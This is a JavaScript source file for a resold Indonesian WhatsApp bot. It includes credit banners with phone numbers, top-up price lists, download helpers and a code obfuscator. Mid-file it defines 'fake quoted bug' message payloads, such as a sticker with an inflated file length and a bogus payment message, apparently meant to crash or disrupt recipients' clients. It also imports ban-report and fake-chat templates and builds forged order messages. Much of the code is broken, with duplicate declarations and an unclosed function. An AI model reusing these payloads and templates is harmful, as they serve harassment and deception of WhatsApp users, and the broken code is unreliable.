/*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
SCRIPT INI VERSI V9 PUNYA Hardz SENDIRI JADI JANGAN NGAKU" PUNYA LU LAWACK
BASE ORI DARI RAFATHAR
JANGAN OTAK ATIK, KALO ERROR ITU SALAH LU
JIKA UDAH BELI DI GUA NO REFF !
RECODE TARO ©HzHost.ID
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
JANGAN TERLALU BANYAK DI GANTI
BIAR GAK ERROR GAN
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
JANGAN DIHAPUS CREDIT NYA TOD
THANKS TO ALL CREATOR BOT
CREATED BY © RAFATHAR OFFC

SUPPORT IN THIS SCRIPT
@ RafatharOfficial / Creator & Owner
@ BiiHosting / Creator Support
@ KazzHosting / Recode
@ HwModsWa / Fitur
@ PakTzy / Fitur
@ FoxHost / Fitur
@ HardzOfcMods / Recode
@ AlzareonHost / Support
@ AndiOffc / Support    
@ FazzKull / Support
@ The Dark Family / My Team
@ And My Subcriber/Friends 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰

   • Base By Rafathar
   • Recode By HardzSenpaii 
   • My Contact https://wa.me/6282125002189

 NOTE : 
> JIKA INGIN RECODE JANGAN LUPA LETAK CREDIT GUA
> JANGAN DI SEBAR SC INI SECARA FREE JIKA KETAHUAN SEBAGAI CREATOR AKAN FULL ENC& VIRALKAN !! 
> JANGAN JUAL SCRIPT INI DIBAWAH 15K
> JIKA SCRIPT ERROR SILAHKAN CHAT ADMIN HARDZ KARENA SCRIPT INI HASUL RECODE GW
> JIKA MAU REUPLOAD SILAHKAN TAG AKUN YT GW
@HardzBanxv

[ CREDIT ]
> REAL SC RAFATHAR , RECODE ( HARDZ SENPAII )
> WA 1 : 6382125002189 
> WA 2 : 6282192773770 
> YT : https://www.youtube.com/@HardzBanxv
SEGITU AJA ,GW HARDZ LU PANGGIL ,GW NYAUT BYEE*/

require('./all/settings')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
require("./all/global")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, formatp, parseMention, getRandom, getGroupAdmins } = require('./all/myfunc')
// read database
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const speed = require('performance-now')
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { Configuration, OpenAIApi } = require('openai')
const { color, bgcolor } = require('./all/color')
const { uptotelegra } = require('./all/upload')
const ytdl = require("ytdl-core")
const { dateDatabase } = require('./lib/functions.js')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/addlist');
const { toAudio, toPTT, toVideo,}= require('./lib/converter')
const thumb = fs.readFileSync ('./thumb.png')
const ntnsfw = JSON.parse(fs.readFileSync('./all/database/nsfw.json'))
const pengguna = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const isPremium = JSON.parse(fs.readFileSync('./all/database/premium.json'))
const isUser = pengguna.includes(m.sender)
module.exports = async (Biiofc, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const mime = (quoted.msg || quoted).mimetype || ''
const isGroup = from.endsWith('@g.us')
const DigitalOcean = require('digitalocean');
const botNumber = await Biiofc.decodeJid(Biiofc.user.id)
const IsSeler = fs.readFileSync('./all/database/seler.json')
const sender = m.key.fromMe ? (Biiofc.user.id.split(':')[0]+'@s.whatsapp.net' || Biiofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Biiofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
const hardznum = "6282192773770"
const API_TOKEN = global.apitokendo;
const LINODE_API_TOKEN = global.apilinode;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format("HH:mm:ss");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const ffstalk = require('./scrape/ffstalk')
const scp1 = require('./scrape/scraper') 
const { Client } = require('ssh2');
const dns = require('dns');
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./all/database/deposit");
const { status, order_id, number, SMS } = JSON.parse(fs.readFileSync("./freya/status.json"))
const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const { remini } = require('./freya/remini')
const jsobfus = require('javascript-obfuscator')
const { mediafireDl } = require('./all/database/mediafire.js') 
const db_user = JSON.parse(fs.readFileSync('./freya/user.json'))
const thumbnail1 = fs.readFileSync('./thumb.png')

let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
server = JSON.parse(fs.readFileSync('./database/server.json'))
const grups = JSON.parse(fs.readFileSync('./database/grups.json'))
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const { buttonkal } = require('./all/buttonkal')
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
    let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}

// New List Menu
const menu1 = fs.readFileSync('./database/cmdmenu/menu1/menu1.js')

const totalFitur = () =>{
            var mytext = fs.readFileSync("./appearance.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        
//const hzkkk
const hzkkk = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": thumb,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"6348642505244872\",\"name\":\"RAFATHAR OFFCIAL\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}
//=================================================
//sewainbot
let sewa = {
rizalxdzzdev1: { nama: "1 Hari", harga: 5000, id: "rizalxdzzdev1" },
rizalxdzzdev2: { nama: "3 HARI", harga: 15000, id: "rizalxdzzdev2" },
rizalxdzzdev3: { nama: "5 HARI", harga: 25000, id: "rizalxdzzdev3" },
rizalxdzzdev4: { nama: "7 HARI", harga: 45000, id: "rizalxdzzdev4" },
rizalxdzzdev5: { nama: "10 HARI", harga: 55000, id: "rizalxdzzdev5" },
rizalxdzzdev6: { nama: "14 HARI", harga: 65000, id: "rizalxdzzdev6" },
rizalxdzzdev7: { nama: "21 HARI", harga: 75000, id: "rizalxdzzdev7" },
rizalxdzzdev8: { nama: "30 HARI", harga: 85000, id: "rizalxdzzdev8" },
rizalxdzzdev9: { nama: "UNLIMITED", harga: 95000, id: "rizalxdzzdev10" },
};
// LIST GG RIZAL STORE GMG BROH AOWKWOWKW

   // *⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST MOBILELEGENDS ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ml = {
ML3: { nama: "MOBILELEGEND - 3 Diamond", harga: 1500, id: "ML3" },
ML5: { nama: "MOBILELEGEND - 5 Diamond", harga: 1700, id: "ML5" },
ML11: { nama: "MOBILELEGEND - 11 Diamond", harga: 2900, id: "ML11" },
ML10: { nama: "MOBILELEGEND - 10 Diamond", harga: 3000, id: "ML10" },
ML12: { nama: "MOBILELEGEND - 12 Diamond", harga: 3500, id: "ML12" },
ML14: { nama: "MOBILELEGEND - 14 Diamond", harga: 3600, id: "ML14" },
ML15: { nama: "MOBILELEGEND - 15 Diamond", harga: 4500, id: "ML15" },
ML17: { nama: "MOBILELEGEND - 17 Diamond", harga: 4700, id: "ML17" },
ML19: { nama: "MOBILELEGEND - 19 Diamond", harga: 5400, id: "ML19" },
ML22: { nama: "MOBILELEGEND - 22 Diamond", harga: 5500, id: "ML22" },
ML20: { nama: "MOBILELEGEND - 20 Diamond", harga: 6000, id: "ML20" },
ML28: { nama: "MOBILELEGEND - 28 Diamond", harga: 7000, id: "ML28" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST DANA ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let dana = { 
DANA1: { nama: "DANA 1.000", harga: 2000, id: "DANA1" },
DANA2: { nama: "DANA 2.000", harga: 3000, id: "DANA2" },
DANA3: { nama: "DANA 3.000", harga: 4000, id: "DANA3" },
DANA4: { nama: "DANA 4.000", harga: 5000, id: "DANA4" },
DANA5: { nama: "DANA 5.000", harga: 6000, id: "DANA5" },
DANA6: { nama: "DANA 6.000", harga: 7000, id: "DANA6" },
DANA7: { nama: "DANA 7.000", harga: 8000, id: "DANA7" },
DANA8: { nama: "DANA 8.000", harga: 9000, id: "DANA8" },
DANA9: { nama: "DANA 9.000", harga: 10000, id: "DANA9" },
DANA10: { nama: "DANA 10.000", harga: 11000, id: "DANA10" },
DANA11: { nama: "DANA 11.000", harga: 12000, id: "DANA11" },
DANA12: { nama: "DANA 12.000", harga: 13000, id: "DANA12" },
DANA13: { nama: "DANA 13.000", harga: 14000, id: "DANA13" },
DANA14: { nama: "DANA 14.000", harga: 15000, id: "DANA14" },
DANA15: { nama: "DANA 15.000", harga: 16000, id: "DANA15" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST GOPAY ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let gopay = {
GOPAY1: { nama: "SALDO GOPAY 1.000", harga: 2500, id: "GOPAY1" },
GOPAY2: { nama: "SALDO GOPAY 2.000", harga: 3500, id: "GOPAY2" },
GOPAY3: { nama: "SALDO GOPAY 3.000", harga: 4500, id: "GOPAY3" },
GOPAY4: { nama: "SALDO GOPAY 4.000", harga: 5500, id: "GOPAY4" },
GOPAY5: { nama: "SALDO GOPAY 5.000", harga: 6500, id: "GOPAY5" },
GOPAY6: { nama: "SALDO GOPAY 6.000", harga: 7500, id: "GOPAY6" },
GOPAY7: { nama: "SALDO GOPAY 7.000", harga: 8500, id: "GOPAY7" },
GOPAY8: { nama: "SALDO GOPAY 8.000", harga: 9500, id: "GOPAY8" },
GOPAY9: { nama: "SALDO GOPAY 9.000", harga: 10500, id: "GOPAY9" },
GOPAY10: { nama: "SALDO GOPAY 10.000", harga: 11500, id: "GOPAY10" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST OVO ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ovo = {
OVO5: { nama: "SALDO OVO 5.000", harga: 6000, id: "OVO5" },
OVO10: { nama: "SALDO OVO 10.000", harga: 11500, id: "OVO10" },
OVO15: { nama: "SALDO OVO 15.000", harga: 16500, id: "OVO15" },
OVO20: { nama: "SALDO OVO 20.000", harga: 21500, id: "OVO20" },
OVO25: { nama: "SALDO OVO 25.000", harga: 26500, id: "OVO25" },
OVO30: { nama: "SALDO OVO 30.000", harga: 31500, id: "OVO30" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST  PUBG MOBILE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let pubg = {
PUBG15: { nama: "PUBG MOBILE 15 UC", harga: 3000, id: "PUBG15" },
PUBG16: { nama: "PUBG MOBILE 16 UC", harga: 3200, id: "PUBG" },
PUBG25: { nama: "PUBG MOBILE 25 UC", harga: 4500, id: "PUBG" },
PUBG26: { nama: "PUBG MOBILE 26 UC", harga: 5200, id: "PUBG" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST FREE FIRE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ff = {
FF5: { nama: "5 Diamond Free Fire", harga: 1000, id: "FF5" },
FF10: { nama: "10 Diamond Free Fire", harga: 2000, id: "FF10" },
FF12: { nama: "12 Diamond Free Fire", harga: 2100, id: "FF12" },
FF15: { nama: "15 Diamond Free Fire", harga: 2500, id: "FF15" },
FF20: { nama: "20 Diamond Free Fire", harga: 3300, id: "FF20" },
FF25: { nama: "25 Diamond Free Fire", harga: 4000, id: "FF25" },
FF30: { nama: "30 Diamond Free Fire", harga: 5000, id: "FF30" },
FF40: { nama: "40 Diamond Free Fire", harga: 5555, id: "FF40" },
FF50: { nama: "50 Diamond Free Fire", harga: 6233, id: "FF50" },
FF55: { nama: "55 Diamond Free Fire", harga: 7000, id: "FF55" },
FF60: { nama: "60 Diamond Free Fire", harga: 7700, id: "FF60" },
FF70: { nama: "70 Diamond Free Fire", harga: 9000, id: "FF70" },
FF75: { nama: "75 Diamond", harga: 9300, id: "FF75" },
FF90: { nama: "90 Diamond", harga: 11500, id: "FF90" },
};

//setuser
let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./riza/user.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))}
}})
}
const checkIdSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = false;
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = true;
        }
    })
    return status
}
const checkRefSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].ref
        }
    })
    return status
}
const checkStsSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].status
        }
    })
    return status
}
//BanUser
const banUser = Biiofc.fetchBlocklist

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return Biiofc.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

//total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./appearance.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const premm = JSON.parse(fs.readFileSync("./all/database/premiumm.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isPremiumm = premm.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await Biiofc.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
FN:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
 

  
// Push Message To Console && Auto Read
        if (m.message) {
            Biiofc.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
    
//func makeid
const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() *
    charactersLength));
    }
    return result
}
function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
  }
      

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Biiofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
Biiofc.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
Biiofc.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m }) } 

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}



// Pastikan Anda memiliki API token yang valid dari DigitalOcean dan disimpan dalam variabel API_TOKEN

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

//ssweb
const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/wait.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/admin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/botadmin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/owner.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/group.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickPrivate = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
// TEXT BANNED
const { textbanv1, textbanv2, textbanv3, textbanv4, textbanv5, textbanv6, textbanv7, textbanv8, textbanv9, textbanv10, textbanv11, textbanv12, textbanv13, textbanv14, textbanv15, textbanv16, textbanv17, textbanv18, textbanv19, textbanv20, textbanv21, textbanv22, textbanv23, textbanv24, textbanv25, textbanv26, textbanv27, textbanv28, textbanv29, textbanv30, textbanv31, textbanv32, textbanv33, textbanv34, textbanv35, textbanv36, textbanv37, textbanv38 } = require('./wangsap/textban.js')

// TEXT UNBANNED
const { textunbanv1, textunbanv2, textunbanv3, textunbanv4, textunbanv5, textunbanv6, textunbanv7, textunbanv8, textunbanv9, textunbanv10, textunbanv11, textunbanv12, textunbanv13, textunbanv14, textunbanv15, textunbanv16, textunbanv17, textunbanv18, textunbanv19, textunbanv20, textunbanv21 } = require('./wangsap/textunban.js')

// TEXT UNBANNED SPESIAL
const { textunbanpremv1, textunbanpremv2, textunbanpremv3, textunbanpremv4, textunbanpremv5 } = require('./wangsap/textunbanprem.js')

// TEXT FAKE CHAT 
const { fakec1, fakec2, fakec3, fakec4, fakec5, fakec6, fakec7, fakec8, fakec9, fakec10, fakec11 } = require('./wangsap/fakechat.js')

// TEXT FAKE CHAT NEW
const { fakecn1, fakecn2 } = require('./wangsap/fakechatn.js')

// TOTAL FITUR
const { totalfakechat, totalunban, totalban } = require('./wangsap/total.js')

// TEXT TOOLS
const { tools1, tools2 } = require('./wangsap/tools.js')

// SALDO BRIMO
const { saldoo } = require('./wangsap/saldoo.js')

//pickRandom
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `᭖͜͡𝐇𝐳𝐂𝐨𝐦𝐩𝐚𝐜𝐭`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;BiiofcBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
  async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `𝗖𝗲𝗸𝗶𝗹-𝗠𝗱`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}



const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Biiofc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Biiofc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
